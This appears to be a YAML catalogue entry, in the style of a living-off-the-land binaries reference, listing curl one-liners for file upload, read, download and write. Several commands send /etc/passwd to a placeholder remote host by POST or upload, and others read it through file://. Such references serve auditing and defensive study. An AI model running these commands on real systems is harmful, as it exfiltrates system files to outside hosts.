---
functions:
  file-upload:
    - description: Send a local file to a remote server in a POST request.
      code: |
        curl --data @/etc/passwd http://website.com/
    - description: Send a local file to a remote server in a POST request.
      code: |
        curl -F 'var=@/etc/passwd' http://website.com/
    - description: Send a local file to a remote server in a POST request.
      code: |
        curl --upload-file /etc/passwd http://website.com/
  file-read:
    - description: Read local files by using the file:// schema.
      code: |
        curl file:///etc/passwd
  file-download:
    - description: Downloads a file to a destination.
      code: |
        curl http://website.com/ -o /tmp/
  file-write:
    - description: Uses file-read to effectively copy files.
      code: |
        curl file:///etc/passwd -o /tmp/
---
